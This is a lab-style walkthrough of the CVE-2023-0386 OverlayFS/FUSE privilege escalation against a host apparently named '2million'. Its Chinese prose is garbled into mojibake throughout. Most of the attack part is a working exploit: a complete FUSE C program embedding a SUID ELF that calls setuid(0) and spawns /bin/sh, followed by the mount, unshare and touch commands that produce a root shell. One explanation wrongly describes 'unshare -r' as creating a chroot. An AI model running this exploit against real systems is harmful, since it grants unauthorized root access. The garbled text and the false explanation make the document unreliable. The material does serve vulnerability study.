ä¾‹å¦‚ï¼Œä¸€ä¸ªåœ¨ç”¨æˆ·å‘½åç©ºé—´ A ä¸­è¿è¡Œçš„è¿›ç¨‹å¯èƒ½æœ‰ä¸€ä¸ªç”¨æˆ· ID ä¸º 0ï¼Œçœ‹èµ·æ¥å®ƒæ˜¯ root ç”¨æˆ·ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç”¨æˆ·å‘½åç©ºé—´æ˜ å°„ä¸­å°† 0 æ˜ å°„åˆ°äº† 1000ï¼Œé‚£ä¹ˆå¯¹äºå®¿ä¸»å‘½åç©ºé—´å’Œå…¶ä»–ç”¨æˆ·å‘½åç©ºé—´æ¥è¯´ï¼Œè¿™ä¸ªè¿›ç¨‹çš„ç”¨æˆ· ID å°±æ˜¯ 1000ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ã€‚

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œç”¨æˆ·å‘½åç©ºé—´æ˜ å°„æä¾›äº†ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥è®©è¿›ç¨‹åœ¨å…¶æ‰€åœ¨çš„ç”¨æˆ·å‘½åç©ºé—´å†…æ‹¥æœ‰å®Œå…¨çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œroot ç”¨æˆ·ï¼‰ï¼Œè€Œåœ¨å…¶ä»–å‘½åç©ºé—´ä¸­ä»ç„¶åªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œè¿™å¯¹äºéš”ç¦»å’Œå®‰å…¨æ€§éå¸¸é‡è¦ã€‚



#### ä¸ºä»€ä¹ˆä¼šææƒï¼Ÿ

å› ä¸ºåœ¨ä¸‹å±‚æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æ˜¯ç”¨æˆ·é«˜åº¦å¯æ§çš„ï¼ˆfuseç”Ÿæˆï¼‰ï¼Œå¯ä»¥è‡ªå®šä¹‰ä»»ä½•æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€ä¸ª**suidæ–‡ä»¶**ï¼ˆä½†æ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼ŒFUSE æœ‰ä¸€äº›é»˜è®¤çš„é™åˆ¶ã€‚å…¶ä¸­ä¸€é¡¹é™åˆ¶å°±æ˜¯ï¼Œå®ƒé»˜è®¤æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯ `nosuid`ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒFUSE æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ setuid å’Œ setgid ä½æ˜¯è¢«å¿½ç•¥çš„ï¼Œ**è™½ç„¶å®ƒè¢«fuseå¿½ç•¥ï¼Œä½†æ˜¯suidä½ä»ç„¶å­˜åœ¨**ã€‚ï¼‰ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠŠä¸€ä¸ªnosuidç³»ç»Ÿä¸­suidæ–‡ä»¶é€šè¿‡overlayFSçš„ç‰¹æ€§ä»ä¸‹å±‚æ‹·è´åˆ°ä¸Šå±‚ï¼Œè¿™é‡Œçš„ä¸Šå±‚æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¯¼è‡´**éæ³•çš„suidæ–‡ä»¶è·å¾—çœŸæ­£çš„suidæƒé™**ï¼Œè¿›è€Œè¾¾åˆ°ææƒã€‚



#### æ¼æ´åˆ©ç”¨

> https://github.com/Fanxiaoyao66/CVE-2023-0386 <- è¿™é‡Œæœ‰æˆ‘å†™å¥½çš„expï¼Œå¦‚æœä½ æ‡’å¾—åŠ¨æ‰‹åšä¸€éçš„è¯ã€‚

å‡†å¤‡å·¥ä½œéœ€è¦åˆ›å»ºå¤šä¸ªæ–‡ä»¶å¤¹ï¼Œæ„å»ºå‡ºä¸€ä¸ªoverlayFSã€‚

```shell
cd /tmp
mkdir fuse upper overlay workdir
```

- å…¶ä¸­fuseæ˜¯ç”¨æˆ·è‡ªå®šæ–‡ä»¶ç³»ç»Ÿæ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œä¹Ÿä½œä¸ºoverlayFSçš„ä¸‹å±‚ã€‚

- upperä½œä¸ºoverlayFSçš„ä¸Šå±‚ã€‚

- overlayä½œä¸ºoverlayFSçš„åˆå¹¶å±‚ã€‚

- workdiræ˜¯overlayFSçš„å·¥ä½œç›®å½•ã€‚

1ã€åˆ›å»ºfuseæ–‡ä»¶ç³»ç»Ÿã€‚

ä¸‹é¢çš„fuseä»£ç æ˜¯æˆ‘åœ¨cå¸ˆå‚…çš„åŸºç¡€ä¸Šä¿®æ”¹çš„ã€‚https://github.com/chenaotian/CVE-2023-0386

```c
#define FUSE_USE_VERSION 30

#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static const char *hello_path = "/hello";//fuseæ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªåä¸ºhelloçš„æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯æ–‡ä»¶è·¯å¾„
const char hello_str[] = {//fuseæ–‡ä»¶ç³»ç»Ÿä¸­çš„suid åé—¨æ–‡ä»¶çš„äºŒè¿›åˆ¶å†…å®¹
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

static int hellofs_getattr(const char *path, struct stat *stbuf)//è·å–æ–‡ä»¶æˆ–ç›®å½•çš„å±æ€§ä¿¡æ¯çš„å›è°ƒå‡½æ•°getattr
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {//fuseæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•çš„æƒé™ï¼Œ0755
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, hello_path) == 0) {//helloæ–‡ä»¶çš„æƒé™ï¼Œ777å¹¶ä¸”å¸¦æœ‰SUID
    stbuf->st_mode = S_IFREG | S_ISUID | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = sizeof(hello_str); //helloæ–‡ä»¶å®é™…å¤§å°
    } else {
        res = -ENOENT;
    }

    return res;
}

static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                           off_t offset, struct fuse_file_info *fi)//è·å–ç›®å½•ä¿¡æ¯çš„å‡½æ•°
{
    (void) offset;
    (void) fi;

    if (strcmp(path, "/") != 0) {//ç›®å‰åªæ”¯æŒæŸ¥çœ‹fuseçš„æ ¹ç›®å½•
        return -ENOENT;
    }

    filler(buf, ".", NULL, 0);//é»˜è®¤æ˜¾ç¤º.å’Œ..
    filler(buf, "..", NULL, 0);
    filler(buf, hello_path + 1, NULL, 0);//fuseæ ¹ç›®å½•æœ‰ä¸€ä¸ªhelloæ–‡ä»¶

    return 0;
}

static int hellofs_open(const char *path, struct fuse_file_info *fi)//æ‰“å¼€æ–‡ä»¶çš„openå›è°ƒå‡½æ•°
{
    puts("[+] open_callback");
    puts(path);
    if (strcmp(path, "hello") == 0)
    {
        int fd = open("", fi->flags);

        return -errno;
    }
    return 0;
}

static int hellofs_read(const char *path, char *buf, size_t size, off_t offset,
                        struct fuse_file_info *fi)//è¯»æ–‡ä»¶çš„å›è°ƒå‡½æ•°read
{
    size_t len;
    (void) fi;
    if(strcmp(path, hello_path) != 0) {//åªæ”¯æŒè¯»helloæ–‡ä»¶
        return -ENOENT;
    }
    len = sizeof(hello_str);
    if (offset < len) {
        if (offset + size > len) {
            size = len - offset;
        }
        memcpy(buf, hello_str + offset, size);//è¿”å›helloæ–‡ä»¶çš„å†…å®¹ï¼Œå³ä¸Šé¢çš„äºŒè¿›åˆ¶æ•°ç»„
    } else {
        size = 0;
    }

    return size;
}

static int ioctl_callback(const char *p, int cmd, void *arg,
                          struct fuse_file_info *fi, unsigned int flags, void *data)
{
    puts("[+] ioctl callback");
    printf("path %s\n", p);
    printf("cmd 0x%x\n", cmd);
    return 0;
}

static struct fuse_operations hellofs_oper = {//åªå®ç°ä¸Šè¿°å››ä¸ªå›è°ƒå‡½æ•°å·²ç»å¤Ÿäº†
    .getattr = hellofs_getattr,
    .readdir = hellofs_readdir,
    .open = hellofs_open,
    .read = hellofs_read,
    .ioctl = ioctl_callback
};

int main(int argc, char *argv[])
{
    return fuse_main(argc, argv, &hellofs_oper, NULL);//æ³¨å†Œå›è°ƒå‡½æ•°
}
```

æˆ‘åœ¨ä»–çš„åŸºç¡€ä¸Šæ·»åŠ äº†ä¸€ä¸ª`ioctl_callback`å‡½æ•°ï¼Œä»¥ä¾›åé¢touchæ–‡ä»¶ä½¿ç”¨ï¼Œä¸ç„¶ä¼šæŠ¥é”™å‡½æ•°æœªå®æ–½ã€‚

é€šè¿‡scpä¼ é€æ–‡ä»¶åˆ°é¶æœºï¼š

```shell
scp ~/Desktop/CVE-2023-0386/fuse.c admin@10.10.11.221:/tmp/root
```

![image-20230628144623425](image/image-20230628144623425.png)

ç¼–è¯‘ï¼š

```shell
gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
```

```shell
admin@2million:/tmp/root$ gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
admin@2million:/tmp/root$ ls
efuse  fuse  fuse.c  overlay  upper  workdir
```

åˆ›å»ºfuseæ–‡ä»¶ç³»ç»Ÿï¼š

```shell
./efuse fuse
```

çœ‹åˆ°åœ¨fuseæ–‡ä»¶å¤¹ä¸­å‡ºç°äº†ä¸€ä¸ªrootå±ä¸»å¹¶ä¸”å…·æœ‰suidçš„helloæ–‡ä»¶ï¼š

![image-20230628144906940](image/image-20230628144906940.png)

å› ä¸ºç›®å‰åœ¨fuseä¸­æ˜¯nosuidçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å³ä¾¿æ‰§è¡Œä¹Ÿæ— æ³•ææƒã€‚

2ã€å‡†å¤‡å¥½äº†fuseæ–‡ä»¶ç³»ç»Ÿï¼Œä¸‹ä¸€æ­¥åˆ›å»ºç”¨æˆ·å‘½åç©ºé—´ï¼š

```shell
unshare -Urm
```

---

`unshare` æ˜¯ä¸€ä¸ª Linux å‘½ä»¤ï¼Œç”¨äºä»å½“å‰ shell è¿›ç¨‹ä¸­"è§£é™¤å…±äº«"æŸäº›ç±»å‹çš„åç§°ç©ºé—´ã€‚è¿™æ ·åšå¯ä»¥åˆ›å»ºéš”ç¦»çš„ç¯å¢ƒï¼Œç±»ä¼¼äºè™šæ‹ŸåŒ–ï¼Œä½†ä¸éœ€è¦å®Œå…¨çš„æ“ä½œç³»ç»Ÿã€‚

`unshare` å‘½ä»¤åçš„ `-Urm` å‚æ•°å„è‡ªçš„å«ä¹‰æ˜¯ï¼š

- `-U` é€‰é¡¹è¡¨ç¤ºè§£é™¤å…±äº«ç”¨æˆ·åç§°ç©ºé—´ã€‚è¿™ä¼šä½¿æ–°çš„ shell è¿›ç¨‹åœ¨å…¶è‡ªå·±çš„ç”¨æˆ·åç§°ç©ºé—´ä¸­è¿è¡Œï¼Œæ‰€æœ‰çš„ç”¨æˆ·å’Œç»„ ID æ˜ å°„éƒ½æ˜¯å”¯ä¸€çš„ã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œè™½ç„¶æ–° shell è¿›ç¨‹å¯èƒ½è®¤ä¸ºå®ƒä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œä½†åœ¨å¤–éƒ¨ï¼Œå®ƒå¯èƒ½ä»¥ä¸åŒçš„ã€éç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œã€‚
- `-r` é€‰é¡¹è¡¨ç¤ºå»ºç«‹ä¸€ä¸ªæ–°çš„ root ç›®å½•ï¼ˆchrootï¼‰ï¼Œè¿™æ ·æ–°çš„ shell è¿›ç¨‹å°±ä¸èƒ½è®¿é—®å®é™…æ–‡ä»¶ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚è¿™å¸¸å¸¸ç”¨äºæä¾›ä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒï¼Œæ¯”å¦‚åœ¨ç¼–è¯‘è½¯ä»¶æ—¶ï¼Œä»¥é˜²æ­¢å®ƒæ±¡æŸ“ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚
- `-m` é€‰é¡¹è¡¨ç¤ºè§£é™¤å…±äº« mount ç©ºé—´ã€‚è¿™ä½¿å¾—æ–°çš„ shell è¿›ç¨‹å¯ä»¥æ›´æ”¹æŒ‚è½½ç‚¹ï¼Œè€Œè¿™äº›æ›´æ”¹ä¸ä¼šå½±å“åˆ°å…¶ä»–è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥æŒ‚è½½æ–°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ–è€…æ›´æ”¹ç°æœ‰æŒ‚è½½ç‚¹çš„å±æ€§ï¼Œè€Œä¸ä¼šå½±å“åˆ°ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚

ç»¼åˆæ¥çœ‹ï¼Œ`unshare -Urm` å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ã€éš”ç¦»çš„ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒæœ‰è‡ªå·±çš„ç”¨æˆ·ã€ç»„ã€æŒ‚è½½ç‚¹å’Œ root ç›®å½•ï¼Œä¸ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†å®Œå…¨éš”ç¦»ã€‚

---

3ã€åˆ›å»ºoverlayFSæ–‡ä»¶ç³»ç»Ÿ

ä½¿å­˜åœ¨åé¢çš„fuseæ–‡ä»¶ç³»ç»Ÿä½œä¸ºä¸‹å±‚ï¼Œupperç›®å½•ä½œä¸ºä¸Šå±‚ï¼Œoverlayä½œä¸ºåˆå¹¶å±‚ï¼š

```shell
mount -t overlay overlay -o lowerdir=fuse,upperdir=upper,workdir=workdir overlay
```

è¿™æ—¶ï¼Œåœ¨åˆå¹¶å±‚å·²ç»å‡ºç°äº†helloæ–‡ä»¶ï¼š

![image-20230628150045176](image/image-20230628150045176.png)

è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹helloæ–‡ä»¶ä»¥è¾¾åˆ°å°†helloå¤åˆ¶ä¸€ä»½åˆ°upperæ–‡ä»¶çš„æ•ˆæœï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡touchå‘½ä»¤å®ç°ã€‚

**å¦‚æœtouchä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¼šä¿®æ”¹è¿™ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³ï¼Œæ—¶é—´æˆ³ä½œä¸ºæ–‡ä»¶çš„å…ƒæ•°æ®è¢«ä¿®æ”¹ï¼Œè‡ªç„¶ä¹Ÿä¼šè§¦å‘å¤åˆ¶ã€‚**ï¼ˆå¦‚æœä¸åœ¨å‰é¢å¢åŠ ioctl_callbackçš„å›è°ƒå‡½æ•°ï¼Œæ— æ³•è¿›è¡Œtouchï¼‰

---

`touch` å‘½ä»¤ä¸»è¦ç”¨äºä¿®æ”¹æ–‡ä»¶çš„è®¿é—®æ—¶é—´å’Œä¿®æ”¹æ—¶é—´ï¼Œæˆ–è€…å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°çš„ç©ºæ–‡ä»¶ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ`touch` å‘½ä»¤å¹¶ä¸ä¼šç›´æ¥è°ƒç”¨ `ioctl` å‡½æ•°ã€‚å®ƒé€šå¸¸è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°åŒ…æ‹¬ `open`, `close`, `utimes`, æˆ– `utimensat` ç­‰ã€‚

`ioctl` æ˜¯ä¸€ä¸ªéå¸¸é€šç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºè®¾å¤‡ç‰¹å®šçš„æ“ä½œæˆ–å…¶ä»–æ— æ³•ç”¨æ ‡å‡†ç³»ç»Ÿè°ƒç”¨è¡¨ç¤ºçš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥ç”¨äºæ”¹å˜ç»ˆç«¯çš„è®¾ç½®æˆ–è€…æŸ¥è¯¢ç½‘ç»œè®¾å¤‡çš„çŠ¶æ€ã€‚ç„¶è€Œï¼Œ`touch` å‘½ä»¤ä¸»è¦ä¸æ–‡ä»¶ç³»ç»Ÿäº¤äº’ï¼Œè€Œä¸æ˜¯è®¾å¤‡ï¼Œå› æ­¤é€šå¸¸ä¸éœ€è¦ä½¿ç”¨ `ioctl`ã€‚

ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ„å‘³ç€ç»å¯¹ä¸ä¼šè°ƒç”¨ `ioctl`ï¼Œå› ä¸ºæ–‡ä»¶ç³»ç»Ÿæˆ–è€…è®¾å¤‡é©±åŠ¨å¯ä»¥æä¾›ç‰¹æ®Šçš„ `ioctl` æ“ä½œæ¥è¿›è¡Œç‰¹å®šçš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼ŒæŸäº›æ–‡ä»¶ç³»ç»Ÿå¯èƒ½æä¾›äº†ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³çš„ç‰¹å®š `ioctl` æ“ä½œã€‚ç„¶è€Œï¼Œè¿™ç§æƒ…å†µæ˜¯éå¸¸ç½•è§çš„ï¼Œä¸å±äºå¸¸è§„çš„ `touch` å‘½ä»¤çš„è¡Œä¸ºã€‚

---

å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°é€šè¿‡touchæ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨upperå¾—åˆ°äº†helloã€‚

![image-20230628150319971](image/image-20230628150319971.png)

éšåæˆ‘ä»¬æ¨å‡ºå‡ºå‘½åç©ºé—´ï¼Œæ‰§è¡Œupper/helloå³å¯ææƒæˆåŠŸã€‚

![image-20230628150907762](image/image-20230628150907762.png)
